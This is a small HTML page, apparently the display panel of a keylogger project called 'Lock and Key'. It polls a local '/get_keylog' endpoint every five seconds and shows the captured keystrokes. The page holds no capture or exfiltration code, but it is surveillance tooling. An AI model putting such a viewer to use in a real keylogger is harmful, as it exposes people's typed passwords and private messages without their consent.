<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lock and Key - Keylog Viewer</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #101010; color: aliceblue;}
        h1 { color: #dcdcdc; }
        pre { background: rgb(48, 48, 48); padding: 10px; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; }
    </style>
    <script>
        function fetchKeylog() {
            fetch('/get_keylog')
                .then(response => response.text())
                .then(data => {
                    document.getElementById('keylog').textContent = data;
                })
                .catch(error => console.error('Error fetching keylog:', error));
        }

        setInterval(fetchKeylog, 5000);  // Refresh every 5 seconds
        window.onload = fetchKeylog;  // Load immediately on page load
    </script>
</head>
<body>
    <h1>Keylog Viewer</h1>
    <pre id="keylog">Loading...</pre>
</body>
</html>
